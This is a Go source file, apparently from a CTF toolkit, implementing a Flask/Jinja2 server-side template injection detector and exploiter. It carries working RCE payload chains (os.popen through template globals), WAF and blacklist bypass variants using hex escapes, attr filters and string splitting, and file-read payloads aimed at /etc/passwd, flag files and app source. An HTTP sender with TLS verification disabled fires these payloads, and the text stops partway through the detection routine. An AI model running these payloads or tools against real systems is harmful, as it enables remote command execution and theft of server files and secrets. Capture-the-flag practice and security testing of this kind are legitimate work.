// web.ssti_jinja2 —— Flask/Jinja2 SSTI 检测与利用。
// 对应 legacy/tools/web/ssti_jinja2.py，行为逐行对齐：
//
//	detect : 探针指纹（黑名单下自动切换无数字探针）
//	info   : {{config}} / {{request.environ}}
//	exec   : RCE 阶梯（入口链 × 取 os 两式 → 子类枚举二段式 → 绕过变体）
//	read_file : 4 级阶梯（exec cat 兜底 → builtins.open → open_resource → 路径 oracle）
//
// 过滤绕过：黑名单/超长/限速信号识别；~ 拆片、空格括号 f ( )、\xHH 十六进制、
// 迭代器 __next__ 绕 read；HTML 实体先还原再判定。
//
// 与原 Python 的已知差异：Go regexp 的 \w 为 ASCII（Python 为 Unicode），
// 拆片对 CJK 会按单字符切（语义等价，输出片段更细）。
package web

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"ctfnet/internal/core"
)

// —— 响应判定特征（与 Python 一致） ——
var sstiErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`TemplateSyntaxError`),
	regexp.MustCompile(`jinja2\.exceptions`),
	regexp.MustCompile(`UndefinedError`),
	regexp.MustCompile(`Internal Server Error`),
	regexp.MustCompile(`Traceback \(most recent call last\)`),
	regexp.MustCompile(`Bad Request`),
	regexp.MustCompile(`werkzeug\.exceptions`),
	regexp.MustCompile(`<title>500`),
}
var sstiBlockedPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)\bblocked\b`),
	regexp.MustCompile(`(?i)\bforbidden\b`),
	regexp.MustCompile(`(?i)\bblacklist`),
	regexp.MustCompile(`(?i)\bdenied\b`),
	regexp.MustCompile(`(?i)\bwaf\b`),
}
var sstiTooLongPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)too long`),
	regexp.MustCompile(`(?i)maximum length`),
	regexp.MustCompile(`(?i)too many characters`),
}
var sstiRateLimitPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)too many requests`),
	regexp.MustCompile(`(?i)rate limit`),
}

// 入口链：模板表达式 → 某个 Python 模块的 __globals__ 字典（保序）。
var sstiEntryChains = [][2]string{
	{"self", "self.__init__.__globals__"},
	{"config", "config.__class__.__init__.__globals__"},
	{"lipsum", "lipsum.__globals__"},
	{"cycler", "cycler.__init__.__globals__"},
	{"joiner", "joiner.__init__.__globals__"},
	{"namespace", "namespace.__init__.__globals__"},
	{"url_for", "url_for.__globals__"},
	{"request.application", "request.application.__globals__"},
}

var sstiExecTemplates = []string{
	"{entry}.__builtins__.__import__('os').popen({cmd}).read()",
	"{entry}['os'].popen({cmd}).read()",
}

// exec 绕过变体。{cmd} 为 Jinja2 字符串表达式；needsArgs 表示外带参数。
type sstiExecBypass struct {
	label     string
	tpl       string
	needsArgs bool
}

var sstiExecBypasses = []sstiExecBypass{
	{"attr 链+'o'~'s'",
		`(self|attr('__init__')|attr('__globals__'))['__builtins__']|attr('__import__')('o'~'s')|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()`,
		false},
	{"attr 链+'o'~'s'(dict)",
		`(self|attr('__init__')|attr('__globals__'))['__builtins__']['__import__']('o'~'s')|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()`,
		false},
	{"十六进制 \\x6f\\x73",
		`self.__init__.__globals__.__builtins__.__import__('\x6f\x73').popen({cmd}).read()`,
		false},
	{"十六进制键+attr",
		`self.__init__.__globals__['\x6f\x73']|attr('\x70\x6f\x70\x65\x6e')({cmd})|attr('\x72\x65\x61\x64')()`,
		false},
	{"空格括号 f ( )",
		"self.__init__.__globals__.__builtins__.__import__('os').popen ( {cmd} ).read ( )",
		false},
	{"request.args 外带",
		"self.__init__.__globals__.__builtins__.__import__(request.args.m).Popen(request.args.a,shell=True,stdout=-1).communicate()[0].decode()",
		true},
}

var sstiFileOpenTemplates = []string{
	"{entry}.__builtins__.open({path}).read()",
	"{entry}.__builtins__['open']({path}).read()",
	"{entry}['__builtins__'].open({path}).read()",
	"{entry}['__builtins__']['open']({path}).read()",
}
var sstiFileIterTemplates = []string{
	"{entry}.__builtins__.open({path}).__next__()",
	"{entry}.__builtins__.open({path}).__iter__().__next__()",
}
var sstiOpenResourceRead = []string{
	"request.json_module._app.open_resource ( {path} ).read ( )",
	"request.json_module._app.open_resource({path}).read()",
	"request.json_module._app.open_resource({path}).__next__( )",
	"request.json_module._app.open_resource ( {path} ).__next__ ( )",
	"request.json_module._app.open_resource({path}).__next__()",
}
var sstiOpenResourceReadBlocked = []string{
	"request.json_module._app.open_resource({path}).__next__( )",
	"request.json_module._app.open_resource ( {path} ).__next__ ( )",
	"request.json_module._app.open_resource ( {path} ).read ( )",
	"request.json_module._app.open_resource({path}).read()",
	"request.json_module._app.open_resource({path}).__next__()",
}
var sstiOpenResourceOracle = "request.json_module._app.open_resource({path})"

var sstiFlagCandidates = []string{
	"flag.txt", "flag", "/flag.txt", "/flag", "app.py", "/app/app.py",
	"/app/main.py", "/etc/passwd", "secret.txt",
}

var (
	sstiPathInReprRe = regexp.MustCompile(`name='([^']+)'`)
	sstiFlagRe       = regexp.MustCompile(`(?i)flag\{[^}]+\}`)
	sstiNumericEntRe = regexp.MustCompile(`&#(\d+);`)
	sstiTagRe        = regexp.MustCompile(`<[^>]+>`)
	sstiWordOrOther  = regexp.MustCompile(`\w+|[^\w]`)
	sstiClassesRe    = regexp.MustCompile(`<class '([\w.]+)'>`)
)

var sstiEntityMap = map[string]string{
	"&#39;": "'", "&#x27;": "'", "&#34;": `"`, "&#x22;": `"`,
	"&lt;": "<", "&gt;": ">", "&amp;": "&", "&#x2F;": "/", "&#x5C;": "\\",
}

func init() {
	tool := &sstiJinja2Tool{}
	tool.BaseTool = core.BaseTool{
		NameAttr:     "ssti_jinja2",
		CategoryAttr: core.CatWeb,
		VersionAttr:  "0.2.0",
		TimeoutAttr:  60,
		DescriptionAttr: "Flask/Jinja2 SSTI:探针指纹、信息收集、万能链 RCE、子类枚举、" +
			"过滤绕过(拆片/空格括号/十六进制)、自适应文件读阶梯、路径 oracle",
		ParamsAttr: append(sstiParams(),
			core.ParamSpec{Name: "blocked_words", Type: "text", Required: false, Default: "",
				Description: "已知黑名单词（逗号/换行分隔），payload 自动拆片规避" +
					"（如 flag.txt → 'flag'~'.txt'，ls → 'l'~'s'）"},
			core.ParamSpec{Name: "max_length", Type: "int", Required: false, Default: 0,
				Description: "注入点输入长度上限（如 70），0=不限；超长 payload 自动" +
					"跳过并切换紧凑变体（basename / 拆片）"},
			core.ParamSpec{Name: "interval", Type: "float", Required: false, Default: 0,
				Description: "请求间隔秒数（目标有限速时用）；检测到 429/502 自动 ≥1.5s"},
		),
		Runner: tool.run,
	}
	core.DefaultRegistry.Register(tool)
}

// sstiJinja2Tool Jinja2/Flask SSTI 工具。
type sstiJinja2Tool struct {
	core.BaseTool
}

func (t *sstiJinja2Tool) ValidateParams(params map[string]any) (map[string]any, error) {
	return validateSsti(&t.BaseTool, "exec", params)
}

// targetUnresponsive 对应 Python TargetUnresponsive（熔断中止）。
type targetUnresponsive struct{ msg string }

func (e *targetUnresponsive) Error() string { return e.msg }

// ---------------------------------------------------------------------------
// 小工具函数
// ---------------------------------------------------------------------------

// pyLen 对应 Python len(str)：码点数（Go len 是字节数）。
func pyLen(s string) int { return utf8.RuneCountInString(s) }

func sstiRandMarker() string {
	const cs = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = cs[rand.Intn(len(cs))]
	}
	return "ssti_" + string(b)
}

// sstiQuote Jinja2 字符串字面量：按内容选引号，转义冲突（与 Python _quote 一致）。
func sstiQuote(s string) string {
	if strings.Contains(s, "'") {
		return `"` + strings.ReplaceAll(strings.ReplaceAll(s, `\`, `\\`), `"`, `\"`) + `"`
	}
	return "'" + s + "'"
}

func sstiWrapCmd(cmd, marker string) string {
	return fmt.Sprintf("echo %s;%s;echo %s", marker, cmd, marker)
}

// sstiHTMLUnescape 还原 Flask 自动转义 / HTML 实体。
func sstiHTMLUnescape(text string) string {
	for k, v := range sstiEntityMap {
		text = strings.ReplaceAll(text, k, v)
	}
	return sstiNumericEntRe.ReplaceAllStringFunc(text, func(m string) string {
		cp, err := strconv.Atoi(m[2 : len(m)-1])
		if err == nil && cp >= 32 && cp < 0x110000 {
			return string(rune(cp))
		}
		return m
	})
}

// sstiSafePiece 片段拆解（与 Python _safe_piece 一致）。
func sstiSafePiece(p string, blockedWords []string) string {
	blocked := false
	for _, b := range blockedWords {
		if strings.Contains(p, b) {
			blocked = true
			break
		}
	}
	if !blocked {
		return sstiQuote(p)
	}
	subs := sstiWordOrOther.FindAllString(p, -1)
	out := make([]string, 0, len(subs))
	for _, sub := range subs {
		hasBlocked := false
		for _, b := range blockedWords {
			if strings.Contains(sub, b) {
				hasBlocked = true
				break
			}
		}
		if !hasBlocked {
			out = append(out, sstiQuote(sub))
			continue
		}
		for _, ch := range sub {
			if containsStr(blockedWords, string(ch)) {
				out = append(out, fmt.Sprintf("'\\x%02x'", ch))
			} else {
				out = append(out, sstiQuote(string(ch)))
			}
		}
	}
	return strings.Join(out, "~")
}

// sstiObfuscateStr 黑名单词拆片（与 Python _obfuscate_str 一致）。
func sstiObfuscateStr(s string, blockedWords []string) string {
	var cleaned []string
	for _, b := range blockedWords {
		if b != "" {
			cleaned = append(cleaned, b)
		}
	}
	if len(cleaned) == 0 {
		return sstiQuote(s)
	}
	cuts := map[int]bool{}
	for _, b := range cleaned {
		start := 0
		for {
			i := strings.Index(s[start:], b)
			if i < 0 {
				break
			}
			i += start
			cuts[i] = true
			cuts[i+len(b)] = true
			start = i + 1
		}
	}
	if len(cuts) == 0 {
		return sstiQuote(s)
	}
	var sortedCuts []int
	for c := range cuts {
		sortedCuts = append(sortedCuts, c)
	}
	sort.Ints(sortedCuts)
	var pieces []string
	prev := 0
	for _, c := range sortedCuts {
		if c > prev {
			pieces = append(pieces, s[prev:c])
		}
		prev = c
	}
	if prev < len(s) {
		pieces = append(pieces, s[prev:])
	}
	var out []string
	for _, p := range pieces {
		if p != "" {
			out = append(out, sstiSafePiece(p, cleaned))
		}
	}
	return strings.Join(out, "~")
}

// sstiSmartSplitPath 扩展名边界拆片：'/dir/flag.txt' → '/dir/flag'~'.txt'。
// 注意与 Python 一致：'.hidden' 也拆（head 为空时产生 ”~'.hidden'）。
func sstiSmartSplitPath(path string) string {
	slash := strings.LastIndex(path, "/")
	head, base := path[:slash+1], path[slash+1:]
	if i := strings.LastIndex(base, "."); i >= 0 {
		return sstiQuote(head+base[:i]) + "~" + sstiQuote(base[i:])
	}
	return sstiQuote(path)
}

// sstiCharSplitAll 全部按字符拆（最后手段）。
func sstiCharSplitAll(path string) string {
	var parts []string
	for _, ch := range path {
		parts = append(parts, sstiQuote(string(ch)))
	}
	return strings.Join(parts, "~")
}

// sstiPathExprs 候选路径表达式（去重保序）。
func sstiPathExprs(filePath string, blockedWords []string, smartMode bool) []string {
	var cands []string
	appendUnique := func(s string) {
		for _, c := range cands {
			if c == s {
				return
			}
		}
		cands = append(cands, s)
	}
	if smartMode || len(blockedWords) > 0 {
		appendUnique(sstiSmartSplitPath(filePath))
		if len(blockedWords) > 0 {
			appendUnique(sstiObfuscateStr(filePath, blockedWords))
		}
		appendUnique(sstiCharSplitAll(filePath))
	}
	appendUnique(sstiQuote(filePath))
	base := filePath
	if i := strings.LastIndex(filePath, "/"); i >= 0 {
		base = filePath[i+1:]
	}
	if base != filePath {
		if smartMode || len(blockedWords) > 0 {
			appendUnique(sstiSmartSplitPath(base))
			if len(blockedWords) > 0 {
				appendUnique(sstiObfuscateStr(base, blockedWords))
			}
			appendUnique(sstiCharSplitAll(base))
		}
		appendUnique(sstiQuote(base))
	}
	return cands
}

func sstiFits(payload string, maxLength int) bool {
	return maxLength <= 0 || pyLen(payload) <= maxLength
}

// sstiErrName 映射 Go 网络错误到 Python 异常类名（"[请求失败] {Type}: {e}" 用）。
func sstiErrName(err error) string {
	var ue *url.Error
	if errors.As(err, &ue) {
		if ne, ok := ue.Err.(net.Error); ok && ne.Timeout() {
			return "TimeoutError"
		}
		return "URLError"
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "TimeoutError"
	}
	var oe *net.OpError
	if errors.As(err, &oe) {
		return "ConnectionError"
	}
	return "OSError"
}

// httpStatusStr 报告行里的 HTTP 状态（网络错误为 None，与 Python f"HTTP {status}" 一致）。
func httpStatusStr(status int) string {
	if status < 0 {
		return "None"
	}
	return strconv.Itoa(status)
}

// ---------------------------------------------------------------------------
// HTTP 通道
// ---------------------------------------------------------------------------

type sstiHttp struct {
	baseURL    string
	param      string
	method     string
	timeout    time.Duration
	extraPairs [][2]string
	headers    map[string]string
	client     *http.Client
}

func newSstiHttp(baseURL, param, method string, extraParams string, headers map[string]string) *sstiHttp {
	h := &sstiHttp{
		baseURL:    baseURL,
		param:      param,
		method:     strings.ToUpper(method),
		timeout:    10 * time.Second,
		extraPairs: parseQS(extraParams),
		headers:    map[string]string{},
		client: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
	for k, v := range headers {
		lk := strings.ToLower(k)
		if lk == "content-length" || lk == "transfer-encoding" {
			continue
		}
		h.headers[lk] = v
	}
	return h
}

// sstiEncodePairs 等价 urlencode(parse_qsl(pairs))。
func sstiEncodePairs(pairs [][2]string) string {
	parts := make([]string, 0, len(pairs))
	for _, p := range pairs {
		parts = append(parts, url.QueryEscape(p[0])+"="+url.QueryEscape(p[1]))
	}
	return strings.Join(parts, "&")
}

// send 对应 Python _Http.send：返回 (status, body)，网络错误 status=-1。
// 注入参数排在最前（Flask request.form[key] 取第一个值），额外固定参数追加在后。
func (h *sstiHttp) send(payload string, extraQuery [][2]string) (int, string) {
	pairs := append([][2]string{{h.param, payload}}, h.extraPairs...)
	sep := "?"
	if strings.Contains(h.baseURL, "?") {
		sep = "&"
	}
	var target string
	var body io.Reader
	if h.method == "GET" {
		qs := sstiEncodePairs(pairs)
		if len(extraQuery) > 0 {
			qs += "&" + sstiEncodePairs(extraQuery)
		}
		target = h.baseURL + sep + qs
	} else {
		target = h.baseURL
		if len(extraQuery) > 0 {
			target += sep + sstiEncodePairs(extraQuery)
		}
		body = strings.NewReader(sstiEncodePairs(pairs))
	}
	req, err := http.NewRequest(h.method, target, body)
	if err != nil {
		return -1, fmt.Sprintf("[请求失败] %s: %v", sstiErrName(err), err)
	}
	if _, ok := h.headers["user-agent"]; !ok {
		req.Header.Set("User-Agent", "Mozilla/5.0 (CTF-SSTI-Tool)")
	}
	for k, v := range h.headers {
		req.Header.Set(k, v)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	resp, err := h.client.Do(req)
	if err != nil {
		return -1, fmt.Sprintf("[请求失败] %s: %v", sstiErrName(err), err)
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return -1, fmt.Sprintf("[请求失败] %s: %v", sstiErrName(err), err)
	}
	return resp.StatusCode, strings.ToValidUTF8(string(data), "�")
}

// ---------------------------------------------------------------------------
// 判定 / 节流
// ---------------------------------------------------------------------------

// sstiClassify 对应 Python _classify。status=-1 表示网络错误（None）。
func sstiClassify(body, baseline string, status int) string {
	if strings.HasPrefix(body, "[请求失败]") {
		return "net_error"
	}
	if strings.TrimSpace(body) == "" {
		return "empty"
	}
	text := sstiHTMLUnescape(body)
	if baseline != "" && text == sstiHTMLUnescape(baseline) {
		return "unchanged"
	}
	if status == 429 || status == 502 || anyRe(sstiRateLimitPatterns, text) {
		return "rate_limit"
	}
	if anyRe(sstiBlockedPatterns, text) {
		return "blocked"
	}
	if anyRe(sstiTooLongPatterns, text) {
		return "too_long"
	}
	if anyRe(sstiErrorPatterns, text) {
		return "error"
	}
	return "ok"
}

func anyRe(pats []*regexp.Regexp, s string) bool {
	for _, p := range pats {
		if p.MatchString(s) {
			return true
		}
	}
	return false
}

// sstiPacer 请求节流 + 熔断（对应 Python _Pacer）。
type sstiPacer struct {
	interval    float64
	rateLimited bool
	deadStreak  int
}

const sstiDeadThreshold = 10

func (p *sstiPacer) send(h *sstiHttp, payload string, extraQuery [][2]string) (int, string, error) {
	status, body := h.send(payload, extraQuery)
	if status == 429 || status == 502 || anyRe(sstiRateLimitPatterns, body) {
		p.rateLimited = true
		if p.interval < 1.5 {
			p.interval = 1.5
		}
	}
	if status == 502 || status < 0 {
		p.deadStreak += 2
	} else if strings.TrimSpace(body) == "" {
		p.deadStreak++
	} else if status != 429 {
		p.deadStreak = 0
	}
	if p.deadStreak >= sstiDeadThreshold {
		return status, body, &targetUnresponsive{msg: "连续多次网关 502/空响应/连接失败，目标疑似下线、重启中或端口不通；" +
			"请检查靶机连通性，或换用其他实例/端口"}
	}
	if p.interval > 0 {
		time.Sleep(time.Duration(p.interval * float64(time.Second)))
	}
	return status, body, nil
}

func sstiPocLine(payload string) string {
	return "  └─ POC: " + payload
}

func sstiExcerpt(body string, limit int) string {
	text := sstiHTMLUnescape(body)
	text = sstiTagRe.ReplaceAllString(text, " ")
	text = strings.Join(strings.Fields(text), " ")
	r := []rune(text)
	if len(r) > limit {
		return string(r[:limit]) + "…"
	}
	return text
}

func sstiExtractBetween(body, marker string) (string, bool) {
	text := sstiHTMLUnescape(body)
	i := strings.Index(text, marker)
	if i < 0 {
		return "", false
	}
	j := strings.Index(text[i+len(marker):], marker)
	if j < 0 {
		return "", false
	}
	j += i + len(marker)
	return strings.TrimSpace(text[i+len(marker) : j]), true
}

// sstiMatch49 等价 Python 的 lookaround 正则 (?<![0-9])49(?![0-9])：
// 49 前后不能是数字（RE2 无 lookaround，手动前后字节检查）。
func sstiMatch49(body string) bool {
	for i := 0; i+1 < len(body); i++ {
		if body[i] != '4' || body[i+1] != '9' {
			continue
		}
		if i > 0 && body[i-1] >= '0' && body[i-1] <= '9' {
			continue
		}
		if i+2 < len(body) && body[i+2] >= '0' && body[i+2] <= '9' {
			continue
		}
		return true
	}
	return false
}

// sstiProbeHit 探针命中判定（主探针对 net_error 体做防误判保护，与 Python 一致）。
func sstiProbeHit(pattern, body string, guarded bool) bool {
	if body == "" {
		return false
	}
	if guarded && strings.HasPrefix(body, "[") {
		return false
	}
	switch pattern {
	case `(?<![0-9])49(?![0-9])`:
		return sstiMatch49(body)
	default:
		re, err := regexp.Compile(pattern)
		if err != nil {
			return false
		}
		return re.MatchString(body)
	}
}

func j2Int(p map[string]any, key string) int {
	switch v := p[key].(type) {
	case float64:
		return int(v)
	case int:
		return v
	case string:
		if n, err := strconv.Atoi(v); err == nil {
			return n
		}
	}
	return 0
}

func j2Float(p map[string]any, key string) float64 {
	switch v := p[key].(type) {
	case float64:
		return v
	case int:
		return float64(v)
	case string:
		if f, err := strconv.ParseFloat(v, 64); err == nil {
			return f
		}
	}
	return 0
}

func j2Default(p map[string]any, key, def string) string {
	if v := paramStr(p, key); v != "" {
		return v
	}
	return def
}

// ---------------------------------------------------------------------------
// 工具 run
// ---------------------------------------------------------------------------

type sstiTriedEntry = map[string]any

// sstiTriedEntryMake 对应 Python tried 条目（status 网络错误时为 null）。
func sstiTriedEntryMake(label, class string, status int, payload string) sstiTriedEntry {
	e := sstiTriedEntry{"label": label, "class": class, "len": pyLen(payload), "payload": payload}
	if status >= 0 {
		e["status"] = status
	} else {
		e["status"] = nil
	}
	return e
}

func (t *sstiJinja2Tool) run(ctx context.Context, params map[string]any, tc *core.ToolContext) (*core.ToolResult, error) {
	_ = ctx
	_ = tc
	extraParams := strings.TrimSpace(j2Default(params, "extra_params", ""))
	mode := j2Default(params, "mode", "exec")
	command := j2Default(params, "command", "id")
	filePath := j2Default(params, "file_path", "/etc/passwd")
	customProbe := paramStr(params, "probe")
	customPayload := paramStr(params, "payload")
	var blockedWords []string
	for _, w := range regexp.MustCompile(`[\n,;]+`).Split(paramStr(params, "blocked_words"), -1) {
		w = strings.TrimSpace(w)
		if w != "" {
			blockedWords = append(blockedWords, w)
		}
	}
	maxLength := j2Int(params, "max_length")
	pacer := &sstiPacer{interval: j2Float(params, "interval")}
	signals := map[string]bool{}

	var report []string
	var httpClient *sstiHttp
	raw := strings.TrimSpace(paramStr(params, "raw_request"))
	if raw != "" {
		parsed, err := parseRawHTTPRequest(raw)
		if err != nil {
			return &core.ToolResult{Status: core.StatusError, Stderr: fmt.Sprintf("原始数据包解析失败: %v", err)}, nil
		}
		var names []string
		for _, kv := range parsed.Params {
			names = append(names, kv[0])
		}
		injectParam := strings.TrimSpace(paramStr(params, "param"))
		autoPick := injectParam == ""
		if autoPick && len(names) > 0 {
			injectParam = names[0]
		}
		if injectParam == "" {
			return &core.ToolResult{Status: core.StatusError,
				Stderr: "原始数据包中没有可注入参数（查询串与表单均为空）"}, nil
		}
		if !containsStr(names, injectParam) {
			return &core.ToolResult{Status: core.StatusError,
				Stderr: fmt.Sprintf("注入参数 %q 不在数据包参数中，可选: %s", injectParam, strings.Join(names, ", "))}, nil
		}
		var pktPairs [][2]string
		pktKeys := map[string]bool{}
		for _, kv := range parsed.Params {
			if kv[0] != injectParam {
				pktPairs = append(pktPairs, kv)
				pktKeys[kv[0]] = true
			}
		}
		merged := pktPairs
		for _, kv := range parseQS(extraParams) {
			if !pktKeys[kv[0]] {
				merged = append(merged, kv)
			}
		}
		httpClient = newSstiHttp(parsed.URL, injectParam, parsed.Method, sstiEncodePairs(merged), parsed.Headers)
		var shownParts []string
		for _, kv := range parsed.Params {
			v := kv[1]
			if pyLen(v) > 24 {
				v = string([]rune(v)[:21]) + "…"
			}
			shownParts = append(shownParts, kv[0]+"="+v)
		}
		shown := strings.Join(shownParts, ", ")
		if shown == "" {
			shown = "(空)"
		}
		report = append(report,
			fmt.Sprintf("[原始包] %s %s", parsed.Method, parsed.URL),
			fmt.Sprintf("[原始包] 请求头 %d 个（原样附带，含 Cookie/User-Agent/Content-Type）", len(parsed.Headers)),
			fmt.Sprintf("[原始包] 参数: %s", shown),
			fmt.Sprintf("[原始包] 注入参数: %s%s，其余按原值固定附带", injectParam, map[bool]string{true: "（未指定，自动选第一个）"}[autoPick]),
		)
		if extraParams != "" {
			report = append(report, fmt.Sprintf("[附加] 表单补充固定参数（数据包之外的键）: %s", extraParams))
		}
	} else {
		httpClient = newSstiHttp(paramStr(params, "target_url"), paramStr(params, "param"),
			j2Default(params, "method", "POST"), extraParams, nil)
		if extraParams != "" {
			report = append(report, fmt.Sprintf("[附加] 固定参数: %s", extraParams))
		}
	}
	report = append([]string{fmt.Sprintf("[目标] %s %s（参数 %s）", httpClient.method, httpClient.baseURL, httpClient.param)}, report...)
	if len(blockedWords) > 0 {
		report = append(report, fmt.Sprintf("[绕过] 已知黑名单词: %s", strings.Join(blockedWords, ", ")))
	}
	if maxLength > 0 {
		report = append(report, fmt.Sprintf("[限制] 输入长度上限: %d", maxLength))
	}

	abortedResult := func() *core.ToolResult {
		return &core.ToolResult{Status: core.StatusError, Stdout: strings.Join(report, "\n") + "\n",
			Data: map[string]any{"engine": "jinja2", "mode": mode, "placeholder": false,
				"success": false, "aborted": "target_unresponsive"}}
	}

	baseStatus, baseline, err := pacer.send(httpClient, "__ssti_baseline_"+sstiRandMarker(), nil)
	if err != nil {
		report = append(report, fmt.Sprintf("[中止] %v", err))
		return abortedResult(), nil
	}
	baseCls := sstiClassify(baseline, "", baseStatus)
	if baseCls == "blocked" || baseCls == "too_long" || baseCls == "rate_limit" {
		signals[baseCls] = true
		report = append(report, fmt.Sprintf("[基线] 标记串被过滤（%s）→ 注入点存在黑名单/长度过滤，改用空输入做渲染基线", baseCls))
		baseStatus, baseline, err = pacer.send(httpClient, "", nil)
		if err != nil {
			report = append(report, fmt.Sprintf("[中止] %v", err))
			return abortedResult(), nil
		}
	} else {
		report = append(report, fmt.Sprintf("[基线] HTTP %s，以此判定后续输入是否被渲染", httpStatusStr(baseStatus)))
		if baseStatus < 0 || baseStatus >= 400 || baseCls == "empty" || baseCls == "net_error" {
			switch {
			case baseStatus == 502:
				report = append(report, "[基线] ⚠ 基线返回 502——网关异常，实例很可能已下线/重启中（连续 502 会自动熔断中止）")
			case baseStatus == 429:
				report = append(report, "[基线] ⚠ 基线返回 429——目标限速中，已自动放慢请求节奏")
			default:
				report = append(report, "[基线] ⚠ 基线响应异常——很可能请求结构不对：缺少必填表单字段"+
					"（可在『额外固定参数』补上，如 team_name=x）、参数名错误或端点不接受该请求；"+
					"此时后续判定不可靠，请先修正请求结构")
			}
		}
	}

	if customPayload != "" {
		status, body, err := pacer.send(httpClient, customPayload, nil)
		if err != nil {
			report = append(report, fmt.Sprintf("[中止] %v", err))
			return abortedResult(), nil
		}
		cls := sstiClassify(body, baseline, status)
		report = append(report, fmt.Sprintf("[自定义 payload] → HTTP %s 判定=%s", httpStatusStr(status), cls))
		report = append(report, sstiPocLine(customPayload))
		if cls == "ok" {
			report = append(report, "  └─ 响应摘要: "+sstiExcerpt(body, 3000))
		}
		var excerptVal any
		if cls == "ok" {
			excerptVal = sstiExcerpt(body, 3000)
		}
		return &core.ToolResult{Status: core.StatusSuccess, Stdout: strings.Join(report, "\n") + "\n",
			Data: map[string]any{"engine": "jinja2", "mode": mode, "success": cls == "ok", "excerpt": excerptVal}}, nil
	}

	var data map[string]any
	var runErr error
	switch mode {
	case "detect":
		data, runErr = t.runDetect(httpClient, baseline, customProbe, &report, pacer, signals)
	case "info":
		data, runErr = t.runInfo(httpClient, baseline, &report, pacer, signals)
	case "exec":
		data, runErr = t.runExec(httpClient, baseline, command, &report, pacer, signals, blockedWords, maxLength, false)
	case "read_file":
		data, runErr = t.runRead(httpClient, baseline, filePath, &report, pacer, signals, blockedWords, maxLength)
	default:
		return &core.ToolResult{Status: core.StatusError, Stderr: fmt.Sprintf("未知模式: %s", mode)}, nil
	}
	if runErr != nil {
		var tu *targetUnresponsive
		if errors.As(runErr, &tu) {
			report = append(report, fmt.Sprintf("[中止] %v", tu))
			return abortedResult(), nil
		}
		return nil, runErr
	}

	if pacer.rateLimited {
		report = append(report, "[限速] 目标出现限速响应，已自动放慢请求节奏")
	}
	data["engine"] = "jinja2"
	data["mode"] = mode
	data["placeholder"] = false
	status := core.StatusSuccess
	if (mode == "exec" || mode == "read_file") && !boolVal(data["success"]) {
		status = core.StatusError
	}
	return &core.ToolResult{Status: status, Stdout: strings.Join(report, "\n") + "\n", Data: data}, nil
}

func boolVal(v any) bool {
	b, _ := v.(bool)
	return b
}

// ---------------------------------------------------------------------------
// detect / info
// ---------------------------------------------------------------------------

func (t *sstiJinja2Tool) runDetect(h *sstiHttp, baseline, probe string, report *[]string,
	pacer *sstiPacer, signals map[string]bool) (map[string]any, error) {
	if probe != "" {
		status, body, err := pacer.send(h, probe, nil)
		if err != nil {
			return nil, err
		}
		cls := sstiClassify(body, baseline, status)
		*report = append(*report, fmt.Sprintf("[自定义探针] %s → HTTP %s 判定=%s", probe, httpStatusStr(status), cls))
		if cls == "ok" {
			*report = append(*report, "  └─ 响应摘要: "+sstiExcerpt(body, 3000))
		}
		return map[string]any{"success": cls == "ok",
			"probes": []map[string]any{{"probe": probe, "hit": cls == "ok"}}}, nil
	}

	probes := []struct{ template, pattern, meaning string }{
		{"{{7*7}}", `(?<![0-9])49(?![0-9])`, "Jinja2/Twig/Nunjucks/AngularJS 系"},
		{"{{7*'7'}}", `7777777`, "Jinja2 特有（字符串乘）"},
		{"{{config}}", `(SECRET_KEY|Config)`, "Flask 上下文（config 对象）"},
	}
	fallbackProbes := []struct{ template, pattern, meaning string }{
		{"{{'a'~'a'}}", `\baa\b`, "Jinja2/Twig 字符串拼接（无数字，绕数字黑名单）"},
		{"{{request}}", `Request`, "Flask 上下文（request 对象，绕 config 黑名单）"},
	}
	var results []map[string]any
	filtered := 0
	for _, p := range probes {
		status, body, err := pacer.send(h, p.template, nil)
		if err != nil {
			return nil, err
		}
		cls := sstiClassify(body, baseline, status)
		if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
			signals[cls] = true
			filtered++
			*report = append(*report, fmt.Sprintf("[探针] %s → HTTP %s 判定=%s（%s）", p.template, httpStatusStr(status), cls, p.meaning))
			continue
		}
		hit := sstiProbeHit(p.pattern, body, true)
		results = append(results, map[string]any{"probe": p.template, "hit": hit, "meaning": p.meaning})
		hitStr := "否"
		if hit {
			hitStr = "是"
		}
		*report = append(*report, fmt.Sprintf("[探针] %s → HTTP %s 命中=%s（%s）", p.template, httpStatusStr(status), hitStr, p.meaning))
	}
	if filtered > 0 {
		*report = append(*report, "[探测] 探针被过滤拦截，切换无数字/无关键词探针继续")
		for _, p := range fallbackProbes {
			status, body, err := pacer.send(h, p.template, nil)
			if err != nil {
				return nil, err
			}
			cls := sstiClassify(body, baseline, status)
			if cls == "blocked" || cls == "too_long" || cls == "rate_limit" {
				signals[cls] = true
				*report = append(*report, fmt.Sprintf("[探针] %s → HTTP %s 判定=%s（%s）", p.template, httpStatusStr(status), cls, p.meaning))
				continue
			}
			hit := sstiProbeHit(p.pattern, body, false)
			results = append(results, map[string]any{"probe": p.template, "hit": hit, "meaning": p.meaning})
			hitStr := "否"
			if hit {
				hitStr = "是"
			}
			*report = append(*report, fmt.Sprintf("[探针] %s → HTTP %s 命中=%s（%s）", p.template, httpStatusStr(status), hitStr, p.meaning))
		}
	}

	hit := func(probe string) bool {
		for _, r := range results {
			if b, _ := r["hit"].(bool); b {
				if s, _ := r["probe"].(string); s == probe {
					return true
				}
			}
		}
		return false
	}
